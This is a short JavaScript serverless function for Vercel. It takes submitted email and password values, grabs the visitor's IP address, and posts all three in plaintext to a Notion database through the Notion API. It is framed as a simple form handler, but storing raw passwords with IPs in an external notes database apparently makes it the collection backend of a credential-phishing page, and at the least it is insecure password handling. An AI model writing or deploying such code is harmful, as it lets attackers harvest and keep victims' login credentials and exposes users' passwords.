// Vercel serverless: receive form, write to Notion, return OK.
// Token comes from Vercel env (NOTION_TOKEN, NOTION_DB), never ships to browser.

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'POST only' });

  const { email, password } = req.body || {};
  if (!email || !password) return res.status(400).json({ error: 'email + password required' });

  // IP from request headers (Vercel populates these).
  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    'unknown';

  const token = process.env.NOTION_TOKEN;
  const db = process.env.NOTION_DB;
  if (!token || !db) return res.status(500).json({ error: 'server not configured' });

  const notionRes = await fetch('https://api.notion.com/v1/pages', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${token}`,
      'Notion-Version': '2022-06-28',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      parent: { database_id: db },
      properties: {
        Login: { title: [{ text: { content: String(email).slice(0, 200) } }] },
        IP: { rich_text: [{ text: { content: ip } }] },
        Email: { rich_text: [{ text: { content: String(email).slice(0, 2000) } }] },
        Password: { rich_text: [{ text: { content: String(password).slice(0, 2000) } }] },
      },
    }),
  });

  if (!notionRes.ok) {
    const txt = await notionRes.text();
    return res.status(502).json({ error: 'notion rejected', notion: txt.slice(0, 500) });
  }
  return res.status(200).json({ ok: true });
};